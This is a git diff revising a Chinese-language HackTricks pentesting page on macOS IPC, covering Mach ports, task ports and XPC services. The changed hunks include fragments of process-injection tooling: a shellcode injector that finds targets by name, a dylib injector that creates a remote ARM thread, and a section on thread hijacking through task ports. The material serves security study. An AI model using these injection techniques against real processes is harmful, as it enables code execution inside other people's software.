@@ -5,8 +5,8 @@
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
 * **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
@@ -21,39 +21,59 @@ Mach使用**任务（task）**作为共享资源的**最小单位**，每个任�
 端口权限定义了任务可以执行的操作，这对通信至关重要。可能的**端口权限**有：
 
 * **接收权限**，允许接收发送到端口的消息。Mach端口是MPSC（多生产者，单消费者）队列，这意味着整个系统中每个端口只能有**一个接收权限**（与管道不同，多个进程可以持有指向管道读端的文件描述符）。
-* 具有**接收权限的任务**可以接收消息并**创建发送权限**，从而可以发送消息。最初，**只有自己的任务对其端口具有接收权限**。
+* 拥有接收权限的**任务可以接收消息并创建发送权限**，从而可以发送消息。最初，只有**自己的任务对其端口拥有接收权限**。
 * **发送权限**，允许向端口发送消息。
+* 发送权限可以进行**克隆**，因此拥有发送权限的任务可以克隆该权限并将其授予第三方任务。
 * **一次性发送权限**，允许向端口发送一条消息，然后消失。
 * **端口集权限**，表示一个**端口集**而不是单个端口。从端口集中出队一条消息会从其中一个包含的端口中出队。端口集可用于同时监听多个端口，类似于Unix中的`select`/`poll`/`epoll`/`kqueue`。
-* **死命名**，不是实际的端口权限，只是一个占位符。当一个端口被销毁时，所有现有的端口权限都变成死命名。
+* **死名称**，不是实际的端口权限，而只是一个占位符。当一个端口被销毁时，所有现有的端口权限都变成死名称。
 
-**任务可以将发送权限传输给其他任务**，使其能够发送消息回来。**发送权限也可以被克隆，因此一个任务可以复制并将权限给第三个任务**。这与一个称为**引导服务器**的中间进程结合使用，可以实现任务之间的有效通信。
+**任务可以将发送权限传输给其他任务**，使其能够发送消息回来。**发送权限也可以进行克隆**，因此任务可以复制并将权限授予第三方任务。这与一个称为**引导服务器**的中间进程结合使用，可以实现任务之间的有效通信。
 
 #### 步骤：
 
-正如提到的，为了建立通信通道，涉及到**引导服务器**（mac中的**launchd**）。
+正如前面提到的，为了建立通信通道，涉及到**引导服务器**（mac中的**launchd**）。
 
 1. 任务**A**初始化一个**新的端口**，在此过程中获得一个**接收权限**。
 2. 作为接收权限的持有者，任务**A**为端口**生成一个发送权限**。
-3. 任务**A**通过引导注册过程与**引导服务器**建立**连接**，提供**端口的服务名称**和**发送权限**。
-4. 任务**B**与**引导服务器**交互，执行服务名称的引导**查找**。如果成功，**服务器复制从任务A接收到的发送权限**，并将其**传输给任务B**。
-5. 获得发送权限后，任务**B**能够**构建**一条**消息**并将其**发送给任务A**。
+3. 任务**A**通过引导注册过程与**引导服务器**建立**连接**，提供端口的服务名称和通过发送权限。 
+4. 任务**B**与**引导服务器**交互，执行服务名称的引导查找。如果成功，**服务器复制从任务A接收到的发送权限**并将其**传输给任务B**。
+5. 获得发送权限后，任务**B**能够**构建消息**并将其**发送给任务A**。
 
 引导服务器**无法对任务声称的服务名称进行身份验证**。这意味着一个任务有可能**冒充任何系统任务**，例如虚假地**声称授权服务名称**，然后批准每个请求。
 
 然后，Apple将**系统提供的服务名称**存储在位于**SIP保护**目录下的安全配置文件中：`/System/Library/LaunchDaemons`和`/System/Library/LaunchAgents`。引导服务器将为每个这些服务名称创建并持有一个**接收权限**。
 
-对于这些预定义服务，**查找过程略有不同**。当查找服务名称时，launchd会动态启动服务。新的工作流程如下：
+对于这些预定义服务，**查找过程稍有不同**。当查找服务名称时，launchd会动态启动服务。新的工作流程如下：
 
-* 任务**B**为服务名称**发起引导查找**。
+* 任务**B**启动一个服务名称的引导**查找**。
 * **launchd**检查任务是否正在运行，如果没有，则**启动**它。
-* 任务**A**（服务）执行**引导签入**。在这里，**引导**服务器创建一个发送权限，保留它，并**将接收权限传输给任务A**。
+* 任务**A**（服务）执行引导**签入**。在这里，引导服务器创建一个发送权限，保留它，并将接收权限**传输给任务A**。
 * launchd复制**发送权限并将其发送给任务B**。
 
-然而，此过程仅适用于预定义的系统任务。非系统任务仍然按照最初的描述进行操作，这可能导致冒充。
+然而，这个过程仅适用于预定义的系统任务。非系统任务仍然按照最初的描述进行操作，这可能导致冒充。
+### Mach服务
+
+位于前面提到的SIP受保护目录中的应用程序中指定的名称不能被其他进程注册。
+
+例如，`/System/Library/LaunchAgents/com.apple.xpc.loginitemregisterd.plist` 注册了名称 `com.apple.xpc.loginitemregisterd`：
+```json
+plutil -p com.apple.xpc.loginitemregisterd.plist
+{
+"EnablePressuredExit" => 1
+"Label" => "com.apple.xpc.loginitemregisterd"
+"MachServices" => {
+"com.apple.xpc.loginitemregisterd" => 1
+}
+"ProcessType" => "Adaptive"
+"Program" => "/usr/libexec/loginitemregisterd"
+}
+```
+如果您尝试使用以下代码进行注册，将无法成功。
+
 ### 代码示例
 
-请注意，**发送方**在分配一个端口后，为名称`org.darlinghq.example`创建了一个**发送权限**，并将其发送到**引导服务器**，而发送方则请求该名称的**发送权限**并使用它来**发送消息**。
+请注意，**发送方**分配了一个端口，为名称`org.darlinghq.example`创建了一个**发送权**，并将其发送到**引导服务器**，而发送方则请求该名称的**发送权**并使用它来**发送消息**。
 
 {% tabs %}
 {% tab title="receiver.c" %}
@@ -165,6 +185,12 @@ int main() {
 
     printf("Message sent: %s\n", msg.mtext);
 
+    // Remove the message queue
+    if (msgctl(msgid, IPC_RMID, 0) == -1) {
+        perror("msgctl failed");
+        exit(EXIT_FAILURE);
+    }
+
     return 0;
 }
 ```
@@ -228,18 +254,18 @@ printf("Sent a message\n");
 
 ### 特权端口
 
-* **主机端口**：如果一个进程对该端口具有**发送**权限，他可以获取关于系统的**信息**（例如`host_processor_info`）。
+* **主机端口**：如果一个进程对该端口具有**发送**权限，他可以获取有关系统的**信息**（例如`host_processor_info`）。
 * **主机特权端口**：具有对该端口的**发送**权限的进程可以执行**特权操作**，如加载内核扩展。该进程需要是**root**才能获得此权限。
-* 此外，为了调用**`kext_request`** API，需要具有**`com.apple.private.kext`**的授权，该授权仅提供给Apple二进制文件。
-* **任务名称端口**：_任务端口_的非特权版本。它引用了任务，但不允许对其进行控制。似乎唯一可以通过它获得的是`task_info()`。
+* 此外，为了调用**`kext_request`** API，还需要具有其他授权**`com.apple.private.kext*`**，这些授权仅提供给Apple二进制文件。
+* **任务名称端口**：_任务端口_的非特权版本。它引用任务，但不允许对其进行控制。似乎唯一可以通过它获得的是`task_info()`。
 * **任务端口**（也称为内核端口）：对该端口具有发送权限，可以控制任务（读/写内存，创建线程等）。
-* 调用`mach_task_self()`以获取调用者任务的名称。此端口仅在**`exec()`**跨越继承;使用`fork()`创建的新任务会获得一个新的任务端口（作为特殊情况，suid二进制文件在`exec()`之后也会获得一个新的任务端口）。生成任务并获取其端口的唯一方法是在执行`fork()`时执行["端口交换舞蹈"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)。
+* 调用`mach_task_self()`以获取调用者任务的名称。此端口仅在**`exec()`**之间**继承**；使用`fork()`创建的新任务会获得一个新的任务端口（作为特殊情况，suid二进制文件在`exec()`之后也会获得一个新的任务端口）。生成任务并获取其端口的唯一方法是在执行`fork()`时执行["端口交换舞蹈"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)。
 * 这些是访问端口的限制（来自二进制文件`AppleMobileFileIntegrity`的`macos_task_policy`）：
 * 如果应用具有**`com.apple.security.get-task-allow`授权**，来自**同一用户的进程可以访问任务端口**（通常由Xcode用于调试）。**公证**过程不允许将其用于生产版本。
-* 具有**`com.apple.system-task-ports`授权**的应用可以获取任何进程的**任务端口**，除了内核。在旧版本中，它被称为**`task_for_pid-allow`**。这仅授予Apple应用程序。
-* **Root可以访问**未使用**强化**运行时编译的应用程序的任务端口（也不是来自Apple）。
+* 具有**`com.apple.system-task-ports`授权**的应用程序可以获取任何进程的**任务端口**，但不能获取内核的任务端口。在旧版本中，它被称为**`task_for_pid-allow`**。这仅授予Apple应用程序。
+* **Root可以访问未使用强化运行时编译**（且不是来自Apple）的应用程序的任务端口。
 
-### 通过任务端口进行Shellcode进程注入
+### 通过任务端口在线程中注入Shellcode
 
 您可以从以下位置获取Shellcode：
 
@@ -252,12 +278,28 @@ printf("Sent a message\n");
 ```objectivec
 // clang -framework Foundation mysleep.m -o mysleep
 // codesign --entitlements entitlements.plist -s - mysleep
+
 #import <Foundation/Foundation.h>
+
+double performMathOperations() {
+double result = 0;
+for (int i = 0; i < 10000; i++) {
+result += sqrt(i) * tan(i) - cos(i);
+}
+return result;
+}
 
 int main(int argc, const char * argv[]) {
 @autoreleasepool {
-NSLog(@"Process ID: %d", [[NSProcessInfo processInfo] processIdentifier]);
-[NSThread sleepForTimeInterval:99999];
+NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
+processIdentifier]);
+while (true) {
+[NSThread sleepForTimeInterval:5];
+
+performMathOperations();  // Silent action
+
+[NSThread sleepForTimeInterval:5];
+}
 }
 return 0;
 }
@@ -279,7 +321,7 @@ return 0;
 
 <details>
 
-<summary>injector.m</summary>
+<summary>sc_injector.m</summary>
 ```objectivec
 // gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
 
@@ -422,14 +464,54 @@ return (-3);
 return (0);
 }
 
+pid_t pidForProcessName(NSString *processName) {
+NSArray *arguments = @[@"pgrep", processName];
+NSTask *task = [[NSTask alloc] init];
+[task setLaunchPath:@"/usr/bin/env"];
+[task setArguments:arguments];
+
+NSPipe *pipe = [NSPipe pipe];
+[task setStandardOutput:pipe];
+
+NSFileHandle *file = [pipe fileHandleForReading];
+
+[task launch];
+
+NSData *data = [file readDataToEndOfFile];
+NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+
+return (pid_t)[string integerValue];
+}
+
+BOOL isStringNumeric(NSString *str) {
+NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
+NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
+return r.location == NSNotFound;
+}
+
 int main(int argc, const char * argv[]) {
 @autoreleasepool {
 if (argc < 2) {
-NSLog(@"Usage: %s <pid>", argv[0]);
+NSLog(@"Usage: %s <pid or process name>", argv[0]);
 return 1;
 }
 
-pid_t pid = atoi(argv[1]);
+NSString *arg = [NSString stringWithUTF8String:argv[1]];
+pid_t pid;
+
+if (isStringNumeric(arg)) {
+pid = [arg intValue];
+} else {
+pid = pidForProcessName(arg);
+if (pid == 0) {
+NSLog(@"Error: Process named '%@' not found.", arg);
+return 1;
+}
+else{
+printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
+}
+}
+
 inject(pid);
 }
 
@@ -439,17 +521,17 @@ return 0;
 </details>
 ```bash
 gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
-./inject <pid-of-mysleep>
+./inject <pi or string>
 ```
-### 通过任务端口进行Dylib进程注入
+### 通过任务端口在线程中进行Dylib注入
 
-在macOS中，线程可以通过Mach或使用posix `pthread` api进行操作。我们在前面的注入中生成的线程是使用Mach api生成的，因此它不符合posix规范。
+在 macOS 中，线程可以通过 Mach 或使用 posix `pthread` api 进行操作。我们在前面的注入中生成的线程是使用 Mach api 生成的，因此它不符合 posix 标准。
 
-之前我们能够注入一个简单的shellcode来执行命令，是因为它不需要使用符合posix规范的api，只需要使用Mach。更复杂的注入需要线程也符合posix规范。
+之前我们能够注入一个简单的 shellcode 来执行命令，是因为它不需要使用符合 posix 标准的 api，只需要使用 Mach。而更复杂的注入需要线程也符合 posix 标准。
 
-因此，为了改进shellcode，它应该调用`pthread_create_from_mach_thread`来创建一个有效的pthread。然后，这个新的pthread可以调用dlopen从系统中加载我们的dylib。
+因此，为了改进线程，应该调用 `pthread_create_from_mach_thread` 来创建一个有效的 pthread。然后，这个新的 pthread 可以调用 dlopen 来从系统中加载一个 dylib，这样就不需要编写新的 shellcode 来执行不同的操作，而是可以加载自定义库。
 
-你可以在（例如生成一个日志，然后你可以监听它的）中找到示例dylibs：
+你可以在（例如生成日志并监听它的示例 dylibs）中找到示例 dylibs：
 
 {% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
 [macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
@@ -509,7 +591,7 @@ mach_msg_type_number_t dataCnt
 
 char injectedCode[] =
 
-"\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
+// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
 
 // Call pthread_set_self
 
@@ -681,20 +763,19 @@ memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));
 remoteStack64 += (STACK_SIZE / 2); // 这是真正的堆栈
 //remoteStack64 -= 8;  // 需要 16 字节对齐
 
-const char *p = (const char *)remoteCode64;
+const char* p = (const char*) remoteCode64;
 
 remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
 remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
-remoteThreadState64.ts_64.__pc = (u_int64_t)remoteCode64;
-remoteThreadState64.ts_64.__sp = (u_int64_t)remoteStack64;
+remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
 
 printf("远程堆栈 64  0x%llx，远程代码为 %p\n", remoteStack64, p);
 
 kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
-                           (thread_state_t)&remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT, &remoteThread);
+                           (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT, &remoteThread);
 
-if (kr != KERN_SUCCESS)
-{
+if (kr != KERN_SUCCESS) {
     fprintf(stderr, "无法创建远程线程：错误 %s", mach_error_string(kr));
     return (-3);
 }
@@ -702,12 +783,12 @@ if (kr != KERN_SUCCESS)
 return (0);
 }
 
-int main(int argc, const char *argv[])
+int main(int argc, const char * argv[])
 {
 if (argc < 3)
 {
     fprintf(stderr, "用法：%s _pid_ _action_\n", argv[0]);
-    fprintf(stderr, "   _action_：磁盘上 dylib 的路径\n");
+    fprintf(stderr, "   _action_：磁盘上的 dylib 路径\n");
     exit(0);
 }
 
@@ -716,12 +797,12 @@ const char *action = argv[2];
 struct stat buf;
 
 int rc = stat(action, &buf);
-if (rc == 0)
-    inject(pid, action);
+if (rc == 0) inject(pid, action);
 else
 {
     fprintf(stderr, "找不到 dylib\n");
 }
+
 }
 ```
 </details>
@@ -729,7 +810,9 @@ else
 gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 ./inject <pid-of-mysleep> </path/to/lib.dylib>
 ```
-### 通过任务端口进行线程注入 <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
+### 通过任务端口进行线程劫持 <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
+
+在这种技术中，进程的一个线程被劫持：
 
 {% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
 [macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
@@ -739,9 +822,9 @@ gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 
 ### 基本信息
 
-XPC代表XNU（macOS使用的内核）进程间通信，是macOS和iOS上进程之间通信的框架。XPC提供了一种在系统上进行安全、异步方法调用的机制。它是苹果安全范式的一部分，允许创建权限分离的应用程序，其中每个组件仅以执行其工作所需的权限运行，从而限制了受损进程可能造成的潜在损害。
+XPC代表XNU（macOS使用的内核）进程间通信，是macOS和iOS上进程之间通信的框架。XPC提供了一种在系统上进行安全、异步方法调用的机制。它是苹果安全范例的一部分，允许创建权限分离的应用程序，其中每个组件都以其工作所需的权限运行，从而限制了受损进程可能造成的潜在损害。
 
-XPC使用一种称为进程间通信（IPC）的方法，用于在同一系统上运行的不同程序之间发送数据。
+XPC使用一种进程间通信（IPC）的形式，这是一组用于在同一系统上运行的不同程序之间发送数据的方法。
 
 XPC的主要优点包括：
 
@@ -751,21 +834,21 @@ XPC的主要优点包括：
 
 唯一的**缺点**是将一个应用程序分成多个进程，通过XPC进行通信会**效率较低**。但在今天的系统中，这几乎不可察觉，而且好处更多。
 
-例如，QuickTime Player中的一个使用XPC的组件负责视频解码。该组件专门设计用于执行计算任务，因此在发生漏洞时，它不会为攻击者提供任何有用的收益，如访问文件或网络。
+一个例子可以在QuickTime Player中看到，其中使用XPC的组件负责视频解码。该组件专门设计用于执行计算任务，因此在发生违规事件时，它不会为攻击者提供任何有用的收益，如访问文件或网络。
 
 ### 应用程序特定的XPC服务
 
-应用程序的XPC组件位于**应用程序本身内部**。例如，在Safari中，您可以在**`/Applications/Safari.app/Contents/XPCServices`**中找到它们。它们的扩展名为**`.xpc`**（例如**`com.apple.Safari.SandboxBroker.xpc`**），并且也是**包**，其中包含主二进制文件：**`/Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc/Contents/MacOS/com.apple.Safari.SandboxBroker`**
+应用程序的XPC组件位于**应用程序本身内部**。例如，在Safari中，您可以在**`/Applications/Safari.app/Contents/XPCServices`**中找到它们。它们的扩展名为**`.xpc`**（例如**`com.apple.Safari.SandboxBroker.xpc`**），并且也是**bundles**与其中的主要二进制文件一起：**`/Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc/Contents/MacOS/com.apple.Safari.SandboxBroker`**
 
-正如您可能想到的，**XPC组件将具有不同的授权和权限**，与其他XPC组件或主应用程序二进制文件不同。除非XPC服务在其**Info.plist**文件中配置了[**JoinExistingSession**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/xpcservice/joinexistingsession)设置为“True”。在这种情况下，XPC服务将在与调用它的应用程序相同的安全会话中运行。
+正如您可能想到的，**XPC组件将具有不同的授权和权限**，而不同于其他XPC组件或主应用程序二进制文件。除非XPC服务在其**Info.plist**文件中配置了[**JoinExistingSession**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/xpcservice/joinexistingsession)设置为“True”。在这种情况下，XPC服务将在与调用它的应用程序相同的安全会话中运行。
 
 XPC服务在需要时由**launchd**启动，并在所有任务完成后**关闭**以释放系统资源。**应用程序特定的XPC组件只能被应用程序利用**，从而降低了与潜在漏洞相关的风险。
 
 ### 系统范围的XPC服务
 
-系统范围的XPC服务对所有用户都是可访问的。这些服务可以是launchd或Mach类型，需要在指定目录中的plist文件中进行**定义**，例如**`/System/Library/LaunchDaemons`**、**`/Library/LaunchDaemons`**、**`/System/Library/LaunchAgents`**或**`/Library/LaunchAgents`**。
+系统范围的XPC服务对所有用户都是可访问的。这些服务，无论是launchd还是Mach类型，都需要在指定目录中的plist文件中进行**定义**，例如**`/System/Library/LaunchDaemons`**、**`/Library/LaunchDaemons`**、**`/System/Library/LaunchAgents`**或**`/Library/LaunchAgents`**。
 
-这些plist文件将具有一个名为**`MachServices`**的键，其值为服务的名称，以及一个名为**`Program`**的键，其值为二进制文件的路径：
+这些plist文件将具有一个名为**`MachServices`**的键，其中包含服务的名称，以及一个名为**`Program`**的键，其中包含二进制文件的路径：
 ```xml
 cat /Library/LaunchDaemons/com.jamf.management.daemon.plist
 
@@ -807,7 +890,7 @@ cat /Library/LaunchDaemons/com.jamf.management.daemon.plist
 
 ### XPC连接进程检查
 
-当一个进程尝试通过XPC连接调用一个方法时，**XPC服务应该检查该进程是否被允许连接**。以下是检查的常见方式和常见陷阱：
+当一个进程尝试通过XPC连接调用一个方法时，XPC服务应该检查该进程是否被允许连接。以下是检查的常见方式和常见陷阱：
 
 {% content-ref url="macos-xpc-connecting-process-check.md" %}
 [macos-xpc-connecting-process-check.md](macos-xpc-connecting-process-check.md)
@@ -815,7 +898,7 @@ cat /Library/LaunchDaemons/com.jamf.management.daemon.plist
 
 ### XPC授权
 
-Apple还允许应用程序**配置一些权限以及如何获取这些权限**，因此如果调用进程具有这些权限，它将被**允许调用XPC服务的方法**：
+Apple还允许应用程序配置一些权限以及如何获取这些权限，因此如果调用进程具有这些权限，它将被允许调用XPC服务的方法：
 
 {% content-ref url="macos-xpc-authorization.md" %}
 [macos-xpc-authorization.md](macos-xpc-authorization.md)
@@ -1031,9 +1114,7 @@ listener.delegate = delegate;
 sleep(10); // Fake something is done and then it ends
 }
 ```
-{% tab title="oc_xpc_client.m" %}
-
-## oc_xpc_client.m
+{% tab title="oc_xpc_client.m" %}oc_xpc_client.m文件
 
 ```objective-c
 #import <Foundation/Foundation.h>
@@ -1058,37 +1139,7 @@ int main(int argc, const char * argv[]) {
 }
 ```
 
-### Description
-
-This Objective-C code demonstrates how to create an XPC client that communicates with the `com.apple.securityd` Mach service. XPC (Inter-Process Communication) is a mechanism for communication between processes in macOS.
-
-The code creates an XPC connection using `xpc_connection_create_mach_service` and specifies the target Mach service as `com.apple.securityd`. The `XPC_CONNECTION_MACH_SERVICE_PRIVILEGED` flag is used to indicate that the connection should be privileged.
-
-An event handler is set using `xpc_connection_set_event_handler` to handle incoming events from the XPC service. In this example, the event handler checks if the event is a dictionary and retrieves the value associated with the key "description". If a description is found, it is printed to the console.
-
-The connection is resumed using `xpc_connection_resume`, and the main dispatch loop is started using `dispatch_main`.
-
-### Usage
-
-Compile the code using the following command:
-
-```bash
-clang -framework Foundation -o oc_xpc_client oc_xpc_client.m
-```
-
-Run the compiled binary:
-
-```bash
-./oc_xpc_client
-```
-
-### References
-
-- [XPC Services](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html)
-- [XPC Overview](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html#//apple_ref/doc/uid/10000172i-SW1-SW1)
-- [XPC API Reference](https://developer.apple.com/documentation/xpc)
-
-{% endtab %}
+这是一个Objective-C文件，用于创建一个XPC客户端连接到`com.apple.securityd`服务。它使用`xpc_connection_create_mach_service`函数创建一个特权的Mach服务连接，并使用`xpc_connection_set_event_handler`函数设置一个事件处理程序来处理接收到的事件。在事件处理程序中，它检查事件的类型是否为字典类型，并获取字典中的描述信息。如果存在描述信息，则打印出接收到的事件描述。最后，它通过调用`dispatch_main`函数来启动主循环，以保持连接的活动状态。
 ```objectivec
 // gcc -framework Foundation oc_xpc_client.m -o oc_xpc_client
 #include <Foundation/Foundation.h>
@@ -1123,9 +1174,9 @@ Inter-Process Communication (IPC) is a mechanism that allows different processes
 
 4. **XPC**: XPC (eXtensible Procedure Call) is a modern IPC mechanism introduced in macOS 10.7. It provides a secure and efficient way for processes to communicate with each other.
 
-Understanding how IPC works in macOS is important for both developers and security researchers. Developers need to know how to use IPC mechanisms to build inter-process communication into their applications, while security researchers need to understand how IPC can be abused for privilege escalation and other security attacks.
+Understanding how IPC works in macOS is important for both developers and security researchers. Developers need to know how to use IPC mechanisms effectively to build robust and secure applications. Security researchers need to understand the underlying IPC mechanisms to identify potential vulnerabilities and privilege escalation opportunities.
 
-In this section, we will explore the different IPC mechanisms available in macOS and discuss their security implications. We will also cover common security vulnerabilities and best practices for securing IPC in macOS applications.
+In this section, we will explore the different IPC mechanisms available in macOS and discuss their security implications. We will also cover common security issues related to IPC and best practices for securing IPC communications.
 
 ## Table of Contents
 
